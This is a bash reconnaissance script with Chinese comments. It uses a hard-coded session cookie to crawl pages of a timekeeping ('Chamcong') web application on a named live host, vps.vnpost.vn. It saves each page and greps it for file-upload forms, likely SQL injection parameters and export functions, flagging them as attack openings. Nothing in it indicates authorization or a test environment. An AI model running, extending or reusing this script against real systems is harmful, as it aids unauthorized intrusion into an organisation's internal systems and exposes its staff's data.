#!/bin/bash

COOKIE="ASP.NET_SessionId=omtonrrfveu055ojf1dnmgwx"

echo "🔥 探索Chamcong所有功能页面..."
echo ""

# 核心功能页面
PAGES=(
    "chamcong/TaoBCC_To.aspx"
    "report/inBCC.aspx?ID=MAU2"
    "report/inBCC.aspx?ID=BC01"
    "report/inBCC.aspx?ID=BC02"
    "report/inBCC.aspx?ID=BC03"
    "chamcong/index.aspx"
    "chamcong/top.aspx"
)

for page in "${PAGES[@]}"; do
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "📄 $page"
    
    filename=$(echo "$page" | tr '/?=&' '_')
    curl -sk "http://vps.vnpost.vn/$page" \
        -H "Cookie: $COOKIE" \
        -H "Referer: http://vps.vnpost.vn/chamcong/index.aspx" \
        -o "page_${filename}.html" 2>&1
    
    size=$(wc -c < "page_${filename}.html")
    echo "  大小: $size bytes"
    
    # 检查文件上传
    if grep -qi "upload\|import\|file\|enctype.*multipart" "page_${filename}.html"; then
        echo "  🔥 可能有上传功能!"
    fi
    
    # 检查SQL参数
    if grep -qi "ID=\|UserID=\|id=" "page_${filename}.html"; then
        echo "  ⚠️  可能有SQL注入点"
    fi
    
    # 检查导出功能
    if grep -qi "export\|download\|excel\|xls\|pdf" "page_${filename}.html"; then
        echo "  📁 有导出功能"
    fi
    
    sleep 0.5
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 探索完成"
